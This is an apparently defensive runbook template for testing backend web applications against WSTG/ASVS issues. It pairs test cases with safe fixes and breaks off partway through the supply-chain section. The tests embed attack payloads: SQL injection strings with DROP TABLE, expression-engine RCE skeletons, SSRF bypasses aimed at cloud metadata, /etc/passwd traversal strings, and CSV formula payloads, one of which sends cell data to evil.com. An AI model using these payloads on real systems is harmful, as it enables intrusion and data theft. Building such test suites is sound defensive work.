# Security Testing Runbook — Backend (Generic Template)

> **This file contains `{{PLACEHOLDERS}}`.**
> Hydrate every token from the ADAPTATION MANIFEST before use.
> See §16 for the automated bash script and Claude prompt.

**Companion agent**: `security-tester-backend-generic.md`
**Standards**: WSTG v4.2 · ASVS v4.0.3 Level 1

---

## ADAPTATION MANIFEST (mirrors agent)

| Token | Fill-in | Example |
|---|---|---|
| `{{STACK_NAME}}` | Project name | `SP-MVP1` |
| `{{BACKEND_LANGUAGE}}` | Language | `Kotlin`, `Python`, `Go` |
| `{{FILE_EXT}}` | `rg` type arg | `kotlin`, `python`, `go` |
| `{{SRC_ROOT}}` | Source root path | `src/main/kotlin`, `app/` |
| `{{TEST_ROOT}}` | Test root path | `src/test/kotlin`, `tests/` |
| `{{BACKEND_FRAMEWORK}}` | Framework + version | `Spring Boot 2.7.18` |
| `{{AUTH_FRAMEWORK}}` | Auth library | `Spring Security 5.8.16` |
| `{{ORM_PRIMARY}}` | Main ORM | `JPA/Hibernate`, `SQLAlchemy` |
| `{{ORM_SECONDARY}}` | Secondary ORM or `none` | `MyBatis`, `none` |
| `{{SAFE_PARAM_SYNTAX}}` | Parameterised syntax | `:param`, `$1`, `?` |
| `{{UNSAFE_PARAM_SYNTAX}}` | Injection-prone syntax | `${}`, `f"...{var}"` |
| `{{EXPR_ENGINE}}` | Expression engine or `none` | `JEXL3`, `none` |
| `{{EXPR_RCE_PAYLOAD}}` | Engine-specific RCE payload | see §4 |
| `{{JWT_LIBRARY}}` | JWT library | `Nimbus JOSE`, `python-jose` |
| `{{JWT_ALG_SAFE}}` | Required algorithm | `RS256`, `ES256` |
| `{{AUTH_PROVIDER}}` | IdP | `AWS Cognito`, `Auth0` |
| `{{HTTP_CLIENT}}` | Outbound HTTP client | `RestTemplate`, `httpx` |
| `{{CRYPTO_LIBRARY}}` | Crypto library | `Bouncy Castle`, `cryptography` |
| `{{KMS_PROVIDER}}` | Key management service | `AWS KMS`, `GCP KMS`, `none` |
| `{{FILE_ACCESS_API}}` | File path API | `File() / Paths.get()`, `Path()`, `fs.readFile()` |
| `{{CSV_LIBRARY}}` | CSV output library | `OpenCSV`, `csv.writer`, `fast-csv` |
| `{{HEALTH_ENDPOINT}}` | Health/admin endpoint | `/actuator`, `/__admin` |
| `{{TEST_FRAMEWORK}}` | Test framework | `JUnit 5`, `pytest`, `Jest` |
| `{{TEST_BASE_CLASS}}` | Base test class / fixture | `SecurityTestBase`, `SecurityFixture` |
| `{{HTTP_TEST_CLIENT}}` | HTTP test client | `MockMvc`, `TestClient`, `supertest` |
| `{{DB_CONTAINER}}` | DB test container image | `postgres:15-alpine`, `mysql:8` |
| `{{MOCK_LIBRARY}}` | Mock library | `Mockito`, `unittest.mock`, `jest.mock` |
| `{{ASSERT_LIBRARY}}` | Assertion style | `JUnit assertThrows`, `pytest.raises`, `expect().toThrow()` |
| `{{AUTH_TEST_HELPER}}` | JWT forge helper | `forgeJwt()`, `make_jwt()`, `createToken()` |
| `{{DEP_AUDIT_CMD}}` | Dep audit command | `./gradlew dependencyCheckAnalyze`, `pip-audit` |
| `{{DEP_LOCK_FILE}}` | Lock file | `gradle/verification-metadata.xml`, `poetry.lock` |
| `{{STACK_SPECIFIC_SECTION}}` | Stack-specific traps placeholder | fill in §13 |

---

## Table of Contents

1. [Test Infrastructure Setup](#0-test-infrastructure-setup)
2. [Authentication & Authorization Gaps](#1-authentication--authorization-gaps)
3. [SQL Injection — Primary ORM](#2-sql-injection--primary-orm)
4. [SQL Injection — Secondary ORM / Raw Queries](#3-sql-injection--secondary-orm--raw-queries)
5. [Expression Injection → RCE](#4-expression-injection--rce)
6. [Mass Assignment](#5-mass-assignment)
7. [JWT Validation Failures](#6-jwt-validation-failures)
8. [SSRF via Outbound HTTP](#7-ssrf-via-outbound-http)
9. [Cryptographic Misuse](#8-cryptographic-misuse)
10. [Path Traversal](#9-path-traversal)
11. [Data-Export Formula Injection](#10-data-export-formula-injection)
12. [Admin & Config Endpoint Exposure](#11-admin--config-endpoint-exposure)
13. [Secrets in Config & Hardcoded Credentials](#12-secrets-in-config--hardcoded-credentials)
14. [Stack-Specific Traps](#13-stack-specific-traps)
15. [Supply Chain Integrity](#14-supply-chain-integrity)
16. [WSTG Checklist Cross-Reference](#15-wstg-checklist-cross-reference)
17. [Hydration Script & Claude Prompt](#16-hydration-script--claude-prompt)

---

## 0 — Test Infrastructure Setup

### Design principles

Before writing a single security test, get the infrastructure right.
Two rules apply regardless of stack:

1. **Use a real database container, not an in-memory stub.**  
   In-memory databases (`{{DB_CONTAINER}}` equivalent) often differ in SQL dialect,
   type coercion, and error messaging — injection payloads that would succeed
   against `{{ORM_PRIMARY}}` on PostgreSQL may silently fail against H2 or SQLite,
   giving false confidence.

2. **Centralise auth helpers in one place.**  
   Every test that needs a token should call `{{AUTH_TEST_HELPER}}`.
   If the signing key changes, one function fixes all tests.

### Generic base test class / fixture (pseudocode)

```
// {{TEST_ROOT}}/security/{{TEST_BASE_CLASS}}.{{FILE_EXT}}

@INTEGRATION_TEST_ANNOTATION
@ACTIVE_PROFILE("test")
@DB_CONTAINER_ANNOTATION
class {{TEST_BASE_CLASS}} {

    HTTP_CLIENT: {{HTTP_TEST_CLIENT}}
    DB: ContainerizedDatabase("{{DB_CONTAINER}}")

    // Expose DB URL to application config at test startup
    @DYNAMIC_PROPERTY_SOURCE
    fun configureDb(registry) {
        registry.add("datasource.url", DB::getUrl)
        registry.add("datasource.username", DB::getUsername)
        registry.add("datasource.password", DB::getPassword)
    }

    // JWT forge helper — produces signed token with arbitrary claims
    fun {{AUTH_TEST_HELPER}}(
        subject: String = "test-user",
        roles: List = ["ROLE_USER"],
        algorithm: String = "{{JWT_ALG_SAFE}}",
        expiresIn: Int = 3600
    ): String {
        claims = JWTClaims(subject, roles, issuer=TEST_ISSUER, expiry=now()+expiresIn)
        return sign(claims, TEST_PRIVATE_KEY, algorithm)
    }
}
```

> **Critical note on DB test isolation**: The test DB must be the same engine as
> production. A SQL injection payload like `' AND 1=CAST((SELECT version()) AS INT)--`
> is PostgreSQL-specific and will not fire against SQLite. Use `{{DB_CONTAINER}}`.

---

## 1 — Authentication & Authorization Gaps

**WSTG**: WSTG-ATHZ-02, WSTG-IDNT-01  
**ASVS**: 4.1.1, 4.1.3, 4.2.1  
**Severity**: Critical

### Why every stack has this risk

Auth frameworks have two categories of silent failure:

**Ordering bugs** — Auth rules evaluated top-to-bottom (or first-match). A
`allow-all` rule placed before a `require-auth` rule silently wins. Unlike
compile-time errors, ordering bugs produce no warning.

**Annotation-without-activation** — `{{AUTH_FRAMEWORK}}` may require a global
activation annotation/config (`{{AUTH_ENABLE_ANNOTATION}}`) to make method-level
decorators effective. Without it, `@PreAuthorize`, `@login_required`, etc. compile
and run but have **no effect**.

### Diagnostic
```bash
# Handlers missing auth enforcement
rg "{{ROUTE_ANNOTATION}}" {{SRC_ROOT}} --type {{FILE_EXT}} -l \
  | xargs rg -L "{{AUTH_ANNOTATION}}"

# Global method security enabled?
rg '{{AUTH_ENABLE_ANNOTATION}}' --type {{FILE_EXT}} -n

# Catch-all allow-all (must be the very last rule)
rg '{{PERMIT_ALL_PATTERN}}' --type {{FILE_EXT}} -n
```

### Test template

```
// {{TEST_ROOT}}/security/AuthorizationTest.{{FILE_EXT}}
extends {{TEST_BASE_CLASS}}

TEST "unauthenticated request to protected endpoint returns 401" {
    response = HTTP_TEST_CLIENT.GET("/api/admin/users")
        .withoutToken()
    assert response.status == 401
}

TEST "low-privilege role cannot reach admin endpoint" {
    token = {{AUTH_TEST_HELPER}}(roles=["ROLE_USER"])
    response = HTTP_TEST_CLIENT.GET("/api/admin/users")
        .withBearerToken(token)
    assert response.status == 403
}

TEST "IDOR: user A cannot read user B resource" {
    tokenA = {{AUTH_TEST_HELPER}}(subject="user-a", roles=["ROLE_USER"])
    userBId = createUser("user-b")
    response = HTTP_TEST_CLIENT.GET("/api/users/" + userBId + "/data")
        .withBearerToken(tokenA)
    assert response.status == 403
}

TEST "undefined path returns 401, not 200 or 404" {
    response = HTTP_TEST_CLIENT.GET("/api/not-a-real-route-" + randomUUID())
        .withoutToken()
    assert response.status == 401  // catch-all must deny
}
```

### Fix pattern

```
// Auth config ({{BACKEND_FRAMEWORK}} idiom — adapt to actual framework)
configureAuth {
    // PUBLIC exceptions listed explicitly
    allow("/api/public/**", "/{{HEALTH_ENDPOINT}}/health", "/{{HEALTH_ENDPOINT}}/info")
    // Privilege-specific routes before the catch-all
    requireRole("ADMIN", "/api/admin/**")
    // Catch-all MUST be last
    requireAuthentication("/**")
}
```

---

## 2 — SQL Injection — Primary ORM

**WSTG**: WSTG-INPV-05  
**ASVS**: 5.3.4  
**Severity**: High–Critical

### Why this is non-obvious in `{{ORM_PRIMARY}}`

ORM query languages (JPQL, HQL, LINQ) feel safer than raw SQL because they operate
on objects rather than tables. They are not. String interpolation into an ORM query
language is just as exploitable as raw SQL, and often less scrutinised because
developers assume the ORM "handles it".

Key payloads that work regardless of ORM abstraction layer:
- Tautology: `' OR '1'='1`
- Time-based blind (PostgreSQL): `'; SELECT pg_sleep(5);--`
- Boolean blind: `' AND 1=1--` vs `' AND 1=2--`

### Diagnostic
```bash
# String concatenation / interpolation in query definitions
rg '{{UNSAFE_PARAM_SYNTAX}}' --type {{FILE_EXT}} -n -B2

# Direct query builder with string concat
rg 'createQuery\|buildQuery\|db\.query' --type {{FILE_EXT}} -A2 \
  | rg '{{UNSAFE_PARAM_SYNTAX}}'

# Native / raw queries (highest risk — flag all for manual review)
rg 'nativeQuery\|raw_query\|text=' --type {{FILE_EXT}} -n
```

### Vulnerable vs safe (language-agnostic pattern)

```
// ❌ VULNERABLE — user input interpolated into query string
query = "SELECT * FROM findings WHERE status = " + userInput

// ❌ VULNERABLE — template/f-string in query
query = f"SELECT * FROM findings WHERE severity = '{severity}'"

// ✅ SAFE — parameterised query (always use {{SAFE_PARAM_SYNTAX}})
query = "SELECT * FROM findings WHERE status = {{SAFE_PARAM_SYNTAX}}"
execute(query, params=[userInput])

// ✅ SAFE — ORM method derivation (parameterised by construction)
findByStatusAndSeverity(status, severity)  // no raw query needed
```

### Test template

```
PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "'; DROP TABLE findings;--",
    "' UNION SELECT null,null--",
    "'; SELECT pg_sleep(5);--"
]

TEST "{{ORM_PRIMARY}} parameterised queries reject SQL injection" {
    seedRow = createFinding(status="OPEN")

    for payload in PAYLOADS {
        rows = findingRepository.findByStatus(payload)
        assert rows.isEmpty(),
            "SQLi payload returned rows: " + payload
    }
}

TEST "native query rejects tautology payload" {
    for payload in PAYLOADS {
        result = findingRepository.findBySeverityNative(payload)
        assert result.isEmpty()
    }
}
```

---

## 3 — SQL Injection — Secondary ORM / Raw Queries

**WSTG**: WSTG-INPV-05  
**ASVS**: 5.3.4  
**Severity**: High (often missed in code review)

> **Skip this section if `{{ORM_SECONDARY}}` = `none`.**

### Why `{{ORM_SECONDARY}}` is the most overlooked injection surface

Projects that use a second query mechanism alongside the primary ORM (common when
the primary ORM is too slow for bulk reads, or was introduced later) have two
injection surfaces. Reviewers typically audit the primary ORM and miss the second.

Common patterns:
- **XML mapper files** (MyBatis): `${}` = string substitution, `#{}` = parameterised
- **Raw query strings** (psycopg2, node-postgres): `%s` format or template literals
- **Dynamic ORDER BY / LIMIT**: `${}` or `format()` necessary for column names —
  must be validated against a strict allowlist

### Diagnostic
```bash
rg '{{SECONDARY_PARAM_UNSAFE}}' \
  --glob '**/*.xml' --glob '**/*.sql' -n

rg 'ORDER BY.*{{SECONDARY_PARAM_UNSAFE}}\|LIMIT.*{{SECONDARY_PARAM_UNSAFE}}' \
  --glob '**/*.xml' --glob '**/*.sql' -n
```

### Safe ORDER BY allowlist pattern

```
// Service layer — validate before passing to {{ORM_SECONDARY}}
ALLOWED_SORT_COLUMNS = {"severity", "created_at", "title", "status"}

fun findFindings(sortColumn: String) {
    if sortColumn NOT IN ALLOWED_SORT_COLUMNS {
        throw ValidationError("Invalid sort column: " + sortColumn)
        // → 400 Bad Request
    }
    return repository.findAll(sortColumn)  // safe to use ${}
}
```

### Test template

```
TEST "{{ORM_SECONDARY}} #{} prevents tautology injection" {
    result = mapper.findBySeverity("' OR '1'='1")
    assert result.isEmpty()
}

TEST "dynamic ORDER BY rejects non-allowlisted column" {
    {{ASSERT_LIBRARY}}(ValidationError) {
        service.findFindings("1; DROP TABLE findings;--")
    }
}

TEST "ORDER BY allowlist accepts all valid columns" {
    for col in ["severity", "created_at", "title", "status"] {
        assertDoesNotThrow { service.findFindings(col) }
    }
}
```

---

## 4 — Expression Injection → RCE

**WSTG**: WSTG-INPV-11  
**ASVS**: 5.2.4, 5.3.8  
**Severity**: **Critical** — remote code execution possible

> **Skip this section if `{{EXPR_ENGINE}}` = `none`.**

### The universal risk model

Expression / template engines (`{{EXPR_ENGINE}}`) are typically introduced for
dynamic rule evaluation or report templating. Most support access to the host
runtime — Java class access, Python `__import__`, Node.js `require` — unless
explicitly sandboxed. When user-supplied data reaches the `eval/execute` call,
it is a one-shot RCE.

**The critical misuse pattern:**  
The expression string comes from a config source (safe) but the expression
**context variables** are user-supplied (safe in isolation). The mistake is when
developers treat user input as an expression rather than as a data value.

### RCE payload patterns by engine

| Engine | Payload skeleton |
|---|---|
| JEXL3 | `"".class.forName("java.lang.Runtime").getMethod("exec",...).invoke(...)` |
| Jinja2 | `{{ "".__class__.__mro__[1].__subclasses__()[<n>].__init__.__globals__["os"].popen("id").read() }}` |
| Groovy | `"id".execute().text` |
| Server-Side Template (generic) | `${7*7}` (probe), then escalate if successful |
| EL / SpEL | `#{T(java.lang.Runtime).getRuntime().exec("id")}` |

### Diagnostic
```bash
rg '{{EXPR_IMPORT_PATTERN}}' --type {{FILE_EXT}} -n
rg '{{EXPR_EVAL_PATTERN}}' --type {{FILE_EXT}} -B10 \
  | rg 'request\.\|queryParam\|body\|userInput'
rg '{{EXPR_SANDBOX_PATTERN}}' --type {{FILE_EXT}} -n
# Zero results for sandbox = Critical until disproved
```

### Safe vs vulnerable pattern

```
// ❌ CRITICAL — expression string from user request
engine = ExpressionEngine.create()
engine.evaluate(request.body.expression, context)   // RCE

// ✅ SAFE — expression from immutable config, user data is context only
expression = configService.getExpression(ruleId)    // from DB / config, not request
context = { severity: finding.severity }            // data only, not code
engine = ExpressionEngine.create(sandbox=WHITELIST_ONLY)
engine.evaluate(expression, context)
```

### Test template

```
TEST "expression engine rejects user-supplied expression string" {
    payload = { "expression": "{{EXPR_RCE_PAYLOAD}}" }
    response = HTTP_TEST_CLIENT.POST("/api/rules/evaluate")
        .withBody(payload)
        .withBearerToken({{AUTH_TEST_HELPER}}())
    assert response.status == 400   // must reject, must NOT execute
}

TEST "expression engine sandbox blocks runtime access" {
    engine = ExpressionEngine.create(sandbox=WHITELIST_ONLY)
    {{ASSERT_LIBRARY}}(SandboxViolationException) {
        engine.evaluate("{{EXPR_RCE_PAYLOAD}}", emptyContext)
    }
}

TEST "expression field on request DTO fails validation before reaching engine" {
    dto = RequestDTO(expression="1+1")  // expression field must be absent from DTO
    violations = validate(dto)
    assert violations.notEmpty()    // @Null / @JsonIgnore constraint must fire
}
```

---

## 5 — Mass Assignment

**WSTG**: WSTG-INPV-20  
**ASVS**: 5.1.3  
**Severity**: High

### The universal pattern

Any function that copies request data onto a domain object by field name
(`BeanUtils.populate`, `model_validate(**request_dict)`, `Object.assign(entity, req.body)`)
copies **all** matching fields — including `isAdmin`, `role`, `id`, `createdAt`.
The attacker sends `{"isAdmin": true}` alongside a normal update request.

### Diagnostic
```bash
rg '{{MASS_ASSIGN_PATTERN}}' --type {{FILE_EXT}} -n
# Also: ORM entity used directly as request body type
rg '{{ENTITY_ANNOTATION}}' --type {{FILE_EXT}} -l \
  | xargs rg -l '{{REQUEST_BODY_ANNOTATION}}' 2>/dev/null
```

### Safe pattern

```
// ❌ VULNERABLE — copies all fields including isAdmin, role, id
fun updateProfile(request: HttpRequest): User {
    entity = userRepository.find(request.userId)
    BulkCopy(entity, request.allParams())   // maps everything
    return userRepository.save(entity)
}

// ✅ SAFE — explicit DTO with only allowed fields; sensitive fields never deserialised
data class UpdateProfileRequest(
    val displayName: String,   // allowed
    val email: String          // allowed
    // isAdmin, role, id — absent from DTO; never copied
)
fun updateProfile(dto: UpdateProfileRequest, userId: String): User {
    entity = userRepository.find(userId)
    entity.displayName = dto.displayName  // explicit field copy only
    entity.email = dto.email
    return userRepository.save(entity)
}
```

### Test template

```
TEST "isAdmin flag in request body must not persist to database" {
    userId = createUser(isAdmin=false)
    token = {{AUTH_TEST_HELPER}}(subject=userId, roles=["ROLE_USER"])

    HTTP_TEST_CLIENT.PUT("/api/users/" + userId + "/profile")
        .withBearerToken(token)
        .withBody({ "displayName": "attacker", "isAdmin": true })
    
    stored = userRepository.find(userId)
    assert stored.isAdmin == false,
        "Mass assignment: isAdmin was set to true via request body"
}

TEST "role field in request body must not change user role" {
    userId = createUser(role="USER")
    token = {{AUTH_TEST_HELPER}}(subject=userId, roles=["ROLE_USER"])

    HTTP_TEST_CLIENT.PUT("/api/users/" + userId + "/profile")
        .withBearerToken(token)
        .withBody({ "role": "ADMIN" })

    stored = userRepository.find(userId)
    assert stored.role == "USER"
}
```

---

## 6 — JWT Validation Failures

**WSTG**: WSTG-SESS-10  
**ASVS**: 3.5.2, 3.5.3  
**Severity**: Critical

### The six validation failures every stack must test

| Attack | Root cause | Exploitability |
|---|---|---|
| `alg:none` | Signature skipped entirely | Trivial |
| Algorithm confusion (RS→HS) | RS256 public key used as HMAC secret | Trivial |
| Expired token accepted | `exp` claim not validated | Easy |
| Wrong issuer accepted | `iss` claim not validated | Easy |
| Wrong audience accepted | `aud` claim not validated | Easy |
| `parse()` without `verify()` | `{{JWT_LIBRARY}}` parse ≠ verify | Library-specific |

The last item is the most dangerous library trap: `{{JWT_LIBRARY}}` parsing
a token populates all claims but **does not verify the signature** unless an
explicit verify step is called. Code that logs `"token parsed successfully"`
may have never verified anything.

### Diagnostic
```bash
# Parse without verify
rg '{{JWT_PARSE_PATTERN}}' --type {{FILE_EXT}} -A5 \
  | rg -v '{{JWT_VERIFY_PATTERN}}'

# alg:none explicitly accepted
rg '{{JWT_NONE_PATTERN}}' --type {{FILE_EXT}} -n

# HMAC secret used where asymmetric expected
rg 'HS256\|HS384\|HS512\|HMAC\|MACVerifier' --type {{FILE_EXT}} -n
```

### Test template

```
TEST "token with alg:none is rejected" {
    noneToken = {{AUTH_TEST_HELPER}}(algorithm="none")
    response = HTTP_TEST_CLIENT.GET("/api/me")
        .withBearerToken(noneToken)
    assert response.status == 401
}

TEST "token signed with RS public key as HMAC secret is rejected" {
    // Algorithm confusion: sign with RSA public key bytes using HS256
    confusionToken = signWithHmac(
        payload=validClaims,
        secret=RSA_PUBLIC_KEY_BYTES,   // attacker knows the public key
        algorithm="HS256"
    )
    response = HTTP_TEST_CLIENT.GET("/api/me")
        .withBearerToken(confusionToken)
    assert response.status == 401
}

TEST "expired token is rejected" {
    expiredToken = {{AUTH_TEST_HELPER}}(expiresIn=-1)  // already expired
    response = HTTP_TEST_CLIENT.GET("/api/me")
        .withBearerToken(expiredToken)
    assert response.status == 401
}

TEST "token with wrong issuer is rejected" {
    wrongIssuerToken = {{AUTH_TEST_HELPER}}(
        issuer="https://attacker.com/fake-idp"
    )
    response = HTTP_TEST_CLIENT.GET("/api/me")
        .withBearerToken(wrongIssuerToken)
    assert response.status == 401
}

TEST "token with wrong audience is rejected" {
    wrongAudienceToken = {{AUTH_TEST_HELPER}}(
        audience=["wrong-client-id"]
    )
    response = HTTP_TEST_CLIENT.GET("/api/me")
        .withBearerToken(wrongAudienceToken)
    assert response.status == 401
}

TEST "unsigned (parsed-only) token is rejected" {
    // Reproduce the parse()-without-verify() library trap
    parsedOnlyToken = parseOnly(validSignedToken)  // no signature check
    // If the app uses parse() not verify(), this will return 200 — the bug
    response = HTTP_TEST_CLIENT.GET("/api/me")
        .withRawToken(parsedOnlyToken.serialize())
    assert response.status == 401
}
```

---

## 7 — SSRF via Outbound HTTP

**WSTG**: WSTG-INPV-19  
**ASVS**: 5.1.3  
**Severity**: High–Critical

### Bypass techniques to test regardless of stack

Naive SSRF validators block `localhost` and `127.0.0.1` but miss:

| Bypass | Target resolves to |
|---|---|
| `http://[::1]/` | IPv6 loopback |
| `http://0x7f000001/` | Hex-encoded 127.0.0.1 |
| `http://2130706433/` | Decimal 127.0.0.1 |
| `http://127.1/` | Short form loopback |
| `http://169.254.169.254/` | AWS/GCP instance metadata |
| `http://metadata.google.internal/` | GCP metadata DNS |
| DNS rebinding | Resolves externally during validation, internally at request time |
| `http://attacker.com@169.254.169.254/` | `@` URL authority bypass |

### Diagnostic
```bash
rg '{{HTTP_CLIENT_PATTERN}}' --type {{FILE_EXT}} -n
rg '{{URL_PARAM_PATTERN}}' --type {{FILE_EXT}} -i -n
```

### Safe URL validator

```
BLOCKED_RANGES = [
    "127.0.0.0/8",    // loopback
    "10.0.0.0/8",     // RFC 1918
    "172.16.0.0/12",  // RFC 1918
    "192.168.0.0/16", // RFC 1918
    "169.254.0.0/16", // link-local (AWS metadata)
    "::1/128",        // IPv6 loopback
    "fc00::/7",       // IPv6 ULA
]

fun validateUrl(rawUrl: String): URL {
    url = URL.parse(rawUrl)
    if url.scheme NOT IN ["https"] { throw ValidationError("Only HTTPS allowed") }
    resolvedIp = DNS.resolve(url.host)   // resolve NOW, not at request time
    if resolvedIp IN BLOCKED_RANGES { throw ValidationError("SSRF blocked") }
    return url
}
```

### Test template

```
SSRF_PAYLOADS = [
    "http://127.0.0.1/admin",
    "http://localhost/admin",
    "http://[::1]/admin",
    "http://0x7f000001/admin",
    "http://2130706433/",
    "http://169.254.169.254/latest/meta-data/",
    "http://attacker.com@169.254.169.254/",
]

TEST "SSRF payloads are blocked by URL validator" {
    for payload in SSRF_PAYLOADS {
        response = HTTP_TEST_CLIENT.POST("/api/scan")
            .withBody({ "targetUrl": payload })
            .withBearerToken({{AUTH_TEST_HELPER}}())
        assert response.status IN [400, 403],
            "SSRF payload reached internal network: " + payload
    }
}
```

---

## 8 — Cryptographic Misuse

**ASVS**: 6.2.1, 6.2.2, 6.2.3, 6.2.5, 6.2.6  
**Severity**: High

### The four cryptographic mistakes that appear in every stack

| Mistake | Consequence |
|---|---|
| Weak algorithm (DES, RC4, MD5 as key derivation) | Brute-forceable in hours |
| ECB block cipher mode | Identical plaintext → identical ciphertext; leaks data patterns |
| Missing authenticated encryption context | Ciphertext portable across contexts; TOCTOU substitution |
| Reused / static IV with GCM or CBC | GCM nonce reuse catastrophically breaks confidentiality |

### Diagnostic
```bash
# KMS calls without auth context
rg '{{CRYPTO_CONTEXT_PATTERN}}' --type {{FILE_EXT}} -A8 \
  | rg -v 'encryptionContext\|additionalAuthenticatedData\|aad'

# Weak algorithms
rg '{{WEAK_ALGO_PATTERN}}' --type {{FILE_EXT}} -i -n

# Fixed IV (any byte array literal as IV)
rg 'IvParameterSpec\s*\(\|iv\s*=\s*bytes\(\[0' --type {{FILE_EXT}} -n
```

### Safe patterns

```
// Authenticated encryption — always include binding context
encrypt(
    plaintext = data,
    key = derivedKey,
    algorithm = "AES-256-GCM",
    iv = generateRandom(12),           // 12 bytes, random per call
    aad = { userId, resourceId }       // binding context — prevents ciphertext portability
)

// Key derivation — use KDF, never raw key material
key = PBKDF2(password, salt=randomSalt(32), iterations=600_000, algorithm="SHA-256")
// Or HKDF for programmatic keys
```

### Test template

```
TEST "encryption uses randomly generated IV per call" {
    iv1 = extractIv(encrypt(plaintext="a", key=testKey))
    iv2 = extractIv(encrypt(plaintext="a", key=testKey))
    assert iv1 != iv2, "IV is static — GCM confidentiality broken"
}

TEST "encryption includes authenticated context" {
    ciphertext = encrypt(plaintext="secret", context={userId="u1"})
    {{ASSERT_LIBRARY}}(DecryptionError) {
        decrypt(ciphertext, context={userId="u2"})  // wrong context — must fail
    }
}

TEST "no ECB mode instantiation in codebase" {
    // ArchUnit / AST rule — no class instantiating ECB cipher
    assertNoCipherInstantiation("AES/ECB")
}
```

---

## 9 — Path Traversal

**WSTG**: WSTG-ATHZ-01  
**ASVS**: 12.3.1  
**Severity**: High

### Test template

```
TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",   // URL-encoded
    "....//....//etc/passwd",          // double-dot bypass
    "/etc/passwd",                     // absolute path
    "..\\..\\Windows\\System32\\cmd.exe",  // Windows
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",     // double URL-encode
]

TEST "path traversal payloads are rejected" {
    for payload in TRAVERSAL_PAYLOADS {
        response = HTTP_TEST_CLIENT.GET("/api/files")
            .withParam("filename", payload)
            .withBearerToken({{AUTH_TEST_HELPER}}())
        assert response.status IN [400, 403],
            "Path traversal succeeded: " + payload
    }
}
```

### Safe pattern

```
BASE_DIR = "/app/uploads"

fun resolveFilePath(userFilename: String): Path {
    if NOT userFilename.matches("^[a-zA-Z0-9._-]{1,100}$") {
        throw ValidationError("Invalid filename")
    }
    resolved = Path(BASE_DIR).resolve(userFilename).normalize()
    if NOT resolved.startsWith(BASE_DIR) {
        throw ValidationError("Path traversal detected")
    }
    return resolved
}
```

---

## 10 — Data-Export Formula Injection

**WSTG**: WSTG-INPV-13  
**ASVS**: 5.3.7  
**Severity**: Medium–High

### Why it matters

CSV / Excel exports with `=`, `-`, `+`, `@`, `\t`, `\r` at the start of a cell
execute as formulas when opened in spreadsheet software. If a vulnerability title,
asset name, or description starts with `=CMD|"/C calc"!A0`, an analyst's workstation
executes arbitrary commands when opening the export.

### Test template

```
FORMULA_PAYLOADS = [
    "=CMD|\"/C calc\"!A0",
    "+CMD|\"/C calc\"!A0",
    "-2+3+cmd|'/C calc'!A0",
    "@SUM(1+1)*cmd|'/C whoami'!A0",
    "=HYPERLINK(\"http://evil.com/steal?c=\"&A1,\"click\")",
]

TEST "CSV export sanitises formula characters in cell values" {
    for payload in FORMULA_PAYLOADS {
        finding = createFinding(title=payload)
        csvBytes = exportService.exportToCSV([finding])
        
        lines = csvBytes.split("\n")
        titleCell = parseCsvCell(lines[1], column="title")
        
        assert NOT titleCell.startsWith("=") AND
               NOT titleCell.startsWith("+") AND
               NOT titleCell.startsWith("-") AND
               NOT titleCell.startsWith("@"),
            "Formula injection in CSV: " + titleCell
    }
}
```

### Safe sanitise function

```
fun sanitiseCsvCell(value: String): String {
    FORMULA_STARTERS = ["=", "+", "-", "@", "\t", "\r", "\n"]
    if value.startsWith(any of FORMULA_STARTERS) {
        return "'" + value    // leading quote disables formula interpretation
    }
    return value
}
```

---

## 11 — Admin & Config Endpoint Exposure

**WSTG**: WSTG-CONF-05  
**ASVS**: 7.3.3  
**Severity**: Medium–High

### Test template

```
SENSITIVE_ENDPOINTS = [
    "/{{HEALTH_ENDPOINT}}/env",
    "/{{HEALTH_ENDPOINT}}/beans",
    "/{{HEALTH_ENDPOINT}}/heapdump",
    "/{{HEALTH_ENDPOINT}}/threaddump",
    "/{{HEALTH_ENDPOINT}}/loggers",
    "/{{HEALTH_ENDPOINT}}/mappings",
    "/{{HEALTH_ENDPOINT}}/conditions",
    "/{{HEALTH_ENDPOINT}}/configprops",
]

TEST "sensitive admin endpoints return 401 or 404 to unauthenticated request" {
    for endpoint in SENSITIVE_ENDPOINTS {
        response = HTTP_TEST_CLIENT.GET(endpoint).withoutToken()
        assert response.status IN [401, 403, 404],
            "Sensitive endpoint publicly accessible: " + endpoint
    }
}

TEST "error response does not include stack trace" {
    response = HTTP_TEST_CLIENT.GET("/api/trigger-500-error")
        .withBearerToken({{AUTH_TEST_HELPER}}())
    body = response.json()
    assert "stackTrace" NOT IN body,
        "Stack trace in error response leaks implementation details"
    assert "at com." NOT IN body.get("message", ""),
        "Class path in error message"
}
```

---

## 12 — Secrets in Config & Hardcoded Credentials

**WSTG**: WSTG-CONF-02  
**ASVS**: 2.10.4  
**Severity**: Critical

### Test template (CI gate — runs on every push)

```bash
# Scan all config files for hardcoded credentials
grep -rE \
  "(password|secret|api_?key|token|private_?key)\s*[=:]\s*[^${\s][^\n]{3,}" \
  src/ config/ *.yml *.yaml *.properties *.env \
  --include="*.yml" --include="*.yaml" --include="*.properties" \
  -i \
  && echo "FAIL: Hardcoded credential found" && exit 1

# Scan for AWS key patterns
grep -rE "AKIA[0-9A-Z]{16}" . && echo "FAIL: AWS key in codebase" && exit 1

# Ensure secrets are loaded from environment / vault
grep -rE 'getenv\s*\(.*\)\s*(==|!=)\s*["\x27][A-Za-z0-9]{8,}' \
  {{SRC_ROOT}} && echo "WARN: Hardcoded default in env var lookup"
```

---

## 13 — Stack-Specific Traps

> **This section is intentionally left as a placeholder.**
> When hydrating this runbook for a specific stack, add:
>
> - Framework version-specific gotchas (e.g., Spring Security 5.x antMatcher ordering)
> - ORM-specific pitfalls (e.g., MyBatis `${}` vs `#{}`, Hibernate N+1 in auth queries)
> - Auth provider quirks (e.g., Cognito `parse()` vs `verify()` in Nimbus JOSE)
> - Database-specific injection techniques (e.g., TimescaleDB `time_bucket()` injection)
> - Any CVEs specific to the exact library versions in use
>
> Reference format:
>
> ```
> ### {{STACK_SPECIFIC_TRAP_NAME}}
> **CVE**: {{CVE_IF_APPLICABLE}}
> **Why this version is affected**: ...
> **Diagnostic**: rg pattern
> **Test**: see §0 for base class
> ```

---

## 14 — Supply Chain Integrity

**OWASP Top 10:2025 A06**  
**ASVS**: 10.3.2  
**Severity**: High

### Checks

```bash
# Known vulnerabilities in direct and transitive dependencies
{{DEP_AUDIT_CMD}}

# Dependency pinning — unpinned versions allow silent upgrades
